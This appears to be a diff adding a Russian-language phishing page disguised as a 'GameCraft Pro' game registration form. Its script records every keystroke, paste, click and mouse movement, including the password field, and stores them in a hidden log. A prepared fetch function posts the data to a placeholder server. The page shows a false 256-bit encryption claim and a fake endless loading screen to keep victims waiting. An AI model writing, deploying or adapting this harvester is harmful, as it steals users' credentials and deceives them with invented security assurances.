@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GameCraft Pro - Регистрация</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .game-container {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(30, 30, 46, 0.9);
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+            border: 1px solid #00eeff;
+            position: relative;
+        }
+
+        .header {
+            background: linear-gradient(90deg, #00eeff, #0080ff);
+            padding: 30px;
+            text-align: center;
+            position: relative;
+        }
+
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80%;
+            height: 5px;
+            background: #ff00ff;
+            border-radius: 5px;
+        }
+
+        .game-logo {
+            font-size: 2.8rem;
+            font-weight: 900;
+            background: linear-gradient(45deg, #00eeff, #ff00ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(0, 238, 255, 0.5);
+        }
+
+        .tagline {
+            font-size: 1.2rem;
+            color: #a0a0ff;
+            font-weight: 300;
+        }
+
+        .form-container {
+            padding: 40px 30px;
+        }
+
+        .form-title {
+            text-align: center;
+            font-size: 1.8rem;
+            margin-bottom: 30px;
+            color: #00eeff;
+            text-shadow: 0 0 10px rgba(0, 238, 255, 0.3);
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 10px;
+            color: #a0a0ff;
+            font-size: 1.1rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .input-label i {
+            color: #00eeff;
+        }
+
+        .game-input {
+            width: 100%;
+            padding: 18px 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 2px solid #00eeff;
+            border-radius: 12px;
+            color: white;
+            font-size: 1.1rem;
+            transition: all 0.3s;
+        }
+
+        .game-input:focus {
+            outline: none;
+            border-color: #ff00ff;
+            box-shadow: 0 0 20px rgba(255, 0, 255, 0.3);
+            background: rgba(0, 0, 0, 0.5);
+        }
+
+        .password-strength {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .strength-bar {
+            flex: 1;
+            height: 8px;
+            background: #333;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .strength-bar.fill {
+            background: linear-gradient(90deg, #ff0000, #ffff00, #00ff00);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.7; }
+            50% { opacity: 1; }
+            100% { opacity: 0.7; }
+        }
+
+        .register-btn {
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(90deg, #ff00ff, #00eeff);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 1.3rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .register-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(255, 0, 255, 0.4);
+        }
+
+        .register-btn:active {
+            transform: translateY(0);
+        }
+
+        .register-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transform: rotate(45deg);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .loading-content {
+            text-align: center;
+            max-width: 500px;
+            padding: 40px;
+        }
+
+        .loading-icon {
+            width: 80px;
+            height: 80px;
+            border: 5px solid #333;
+            border-top-color: #00eeff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 30px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 1.5rem;
+            color: #00eeff;
+            margin-bottom: 20px;
+        }
+
+        .loading-dots {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .dot {
+            width: 15px;
+            height: 15px;
+            background: #00eeff;
+            border-radius: 50%;
+            animation: bounce 1.4s infinite ease-in-out;
+        }
+
+        .dot:nth-child(1) { animation-delay: -0.32s; }
+        .dot:nth-child(2) { animation-delay: -0.16s; }
+
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
+        }
+
+        .game-features {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 40px;
+            padding-top: 30px;
+            border-top: 1px solid #333;
+        }
+
+        .feature {
+            text-align: center;
+        }
+
+        .feature i {
+            font-size: 2rem;
+            color: #00eeff;
+            margin-bottom: 10px;
+        }
+
+        .feature-text {
+            font-size: 0.9rem;
+            color: #a0a0ff;
+        }
+
+        .hidden-log {
+            display: none;
+        }
+
+        .fake-message {
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #00ff00;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-size: 0.9rem;
+            color: #a0ffa0;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="game-container">
+        <div class="header">
+            <div class="game-logo">GAMECRAFT PRO</div>
+            <div class="tagline">Будущее гейминга уже здесь</div>
+        </div>
+
+        <div class="form-container">
+            <div class="form-title">Создайте игровой аккаунт</div>
+            
+            <div class="input-group">
+                <label class="input-label">
+                    <i class="fas fa-user"></i>
+                    Игровое имя
+                </label>
+                <input type="text" class="game-input" id="username" placeholder="Введите ваше игровое имя" autocomplete="off">
+            </div>
+
+            <div class="input-group">
+                <label class="input-label">
+                    <i class="fas fa-envelope"></i>
+                    Электронная почта
+                </label>
+                <input type="email" class="game-input" id="email" placeholder="your.email@example.com" autocomplete="off">
+            </div>
+
+            <div class="input-group">
+                <label class="input-label">
+                    <i class="fas fa-lock"></i>
+                    Пароль
+                </label>
+                <input type="password" class="game-input" id="password" placeholder="Создайте надёжный пароль" autocomplete="off">
+                <div class="password-strength">
+                    <div class="strength-bar fill"></div>
+                    <div class="strength-bar fill"></div>
+                    <div class="strength-bar fill"></div>
+                    <div class="strength-bar"></div>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label class="input-label">
+                    <i class="fas fa-gamepad"></i>
+                    Любимый жанр игр
+                </label>
+                <select class="game-input" id="gameGenre">
+                    <option value="">Выберите жанр</option>
+                    <option value="shooter">Шутеры</option>
+                    <option value="rpg">RPG</option>
+                    <option value="strategy">Стратегии</option>
+                    <option value="sports">Спортивные</option>
+                    <option value="mobile">Мобильные</option>
+                </select>
+            </div>
+
+            <div class="fake-message">
+                <i class="fas fa-shield-alt"></i>
+                Ваши данные защищены 256-битным шифрованием
+            </div>
+
+            <button class="register-btn" id="registerBtn">
+                <i class="fas fa-rocket"></i>
+                НАЧАТЬ ИГРУ
+            </button>
+
+            <div class="game-features">
+                <div class="feature">
+                    <i class="fas fa-trophy"></i>
+                    <div class="feature-text">Турниры</div>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-users"></i>
+                    <div class="feature-text">Сообщество</div>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-gift"></i>
+                    <div class="feature-text">Бонусы</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Экран загрузки -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-content">
+            <div class="loading-icon"></div>
+            <div class="loading-text">Создание игрового аккаунта...</div>
+            <div class="loading-dots">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+            <div style="margin-top: 30px; color: #a0a0ff; font-size: 0.9rem;">
+                <i class="fas fa-info-circle"></i>
+                Это может занять несколько минут. Не закрывайте страницу.
+            </div>
+        </div>
+    </div>
+
+    <!-- Скрытый лог для записи ВСЕГО -->
+    <div class="hidden-log" id="hiddenLog"></div>
+
+    <script>
+        // Лог для записи всего
+        let keylogger = [];
+        let lastValue = {
+            username: '',
+            email: '',
+            password: '',
+            gameGenre: ''
+        };
+
+        // Запись ВСЕХ нажатий клавиш
+        function logKey(field, value, action) {
+            const timestamp = new Date().toISOString();
+            keylogger.push({
+                field: field,
+                value: value,
+                action: action,
+                time: timestamp
+            });
+            
+            // Сохраняем в скрытый лог
+            const logDiv = document.getElementById('hiddenLog');
+            logDiv.innerHTML += `<div>${timestamp} | ${field} | ${action}: ${value}</div>`;
+            
+            // Можно добавить отправку на сервер здесь
+            // sendToServer(field, value, action, timestamp);
+        }
+
+        // Отслеживание изменений в полях
+        function trackInput(fieldId, fieldName) {
+            const field = document.getElementById(fieldId);
+            
+            field.addEventListener('input', function(e) {
+                const currentValue = this.value;
+                logKey(fieldName, currentValue, 'input');
+                lastValue[fieldId] = currentValue;
+            });
+            
+            field.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' || e.key === 'Delete') {
+                    logKey(fieldName, `УДАЛЕНО: ${e.key}`, 'delete');
+                }
+            });
+            
+            field.addEventListener('focus', function() {
+                logKey(fieldName, 'ПОЛЕ АКТИВНО', 'focus');
+            });
+            
+            field.addEventListener('blur', function() {
+                logKey(fieldName, 'ПОЛЕ НЕАКТИВНО', 'blur');
+            });
+            
+            field.addEventListener('paste', function(e) {
+                setTimeout(() => {
+                    logKey(fieldName, this.value, 'paste');
+                }, 0);
+            });
+        }
+
+        // Инициализация отслеживания
+        trackInput('username', 'Игровое имя');
+        trackInput('email', 'Email');
+        trackInput('password', 'Пароль');
+        trackInput('gameGenre', 'Жанр игр');
+
+        // Кнопка регистрации
+        document.getElementById('registerBtn').addEventListener('click', function() {
+            // Собираем финальные данные
+            const finalData = {
+                username: document.getElementById('username').value,
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                gameGenre: document.getElementById('gameGenre').value,
+                fullLog: keylogger,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Логируем финальные данные
+            logKey('SYSTEM', JSON.stringify(finalData), 'FINAL_SUBMIT');
+            
+            // Показываем экран загрузки
+            document.getElementById('loadingScreen').style.display = 'flex';
+            
+            // Симуляция "отправки" данных
+            setTimeout(() => {
+                // Здесь можно отправить данные на сервер
+                // simulateSendToServer(finalData);
+                
+                // Добавляем случайные сообщения
+                const messages = [
+                    "Оптимизация графики...",
+                    "Настройка игрового профиля...",
+                    "Подключение к игровым серверам...",
+                    "Загрузка игровых ресурсов...",
+                    "Проверка соединения...",
+                    "Инициализация системы бонусов..."
+                ];
+                
+                // Меняем текст каждые 5 секунд
+                let messageIndex = 0;
+                const loadingText = document.querySelector('.loading-text');
+                
+                const messageInterval = setInterval(() => {
+                    loadingText.innerHTML = messages[messageIndex];
+                    messageIndex = (messageIndex + 1) % messages.length;
+                }, 5000);
+                
+                // Симуляция проблем с подключением
+                setTimeout(() => {
+                    loadingText.innerHTML = "Проблемы с подключением к серверу...";
+                    
+                    // Имитация переподключения
+                    setTimeout(() => {
+                        loadingText.innerHTML = "Переподключение к игровому хабу...";
+                        
+                        // Бесконечная загрузка
+                        setTimeout(() => {
+                            loadingText.innerHTML = "Соединение нестабильно. Пожалуйста, подождите...";
+                        }, 10000);
+                    }, 8000);
+                }, 15000);
+                
+            }, 1000);
+            
+            // Предотвращаем реальную отправку формы
+            return false;
+        });
+
+        // Запись движений мыши
+        document.addEventListener('mousemove', function(e) {
+            if (Math.random() < 0.01) { // Только 1% движений
+                logKey('MOUSE', `x: ${e.clientX}, y: ${e.clientY}`, 'move');
+            }
+        });
+
+        // Запись кликов
+        document.addEventListener('click', function(e) {
+            const target = e.target.tagName + (e.target.id ? '#' + e.target.id : '') + 
+                          (e.target.className ? '.' + e.target.className : '');
+            logKey('CLICK', target, 'click');
+        });
+
+        // Периодическая "отправка" лога
+        setInterval(() => {
+            if (keylogger.length > 0) {
+                console.log('Лог данных:', keylogger);
+                // Здесь можно отправлять данные на сервер
+                // Пример: sendToServerBatch(keylogger.slice(-10));
+            }
+        }, 10000);
+
+        // Функция для отправки на сервер (пример)
+        function sendToServer(data) {
+            // Используем fetch для отправки
+            fetch('https://your-server.com/log', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .catch(error => console.log('Ошибка отправки:', error));
+        }
+
+        // Фейковая проверка пароля
+        document.getElementById('password').addEventListener('input', function() {
+            const bars = document.querySelectorAll('.strength-bar');
+            const length = this.value.length;
+            
+            bars.forEach((bar, index) => {
+                if (index < Math.min(4, Math.floor(length / 3))) {
+                    bar.classList.add('fill');
+                } else {
+                    bar.classList.remove('fill');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
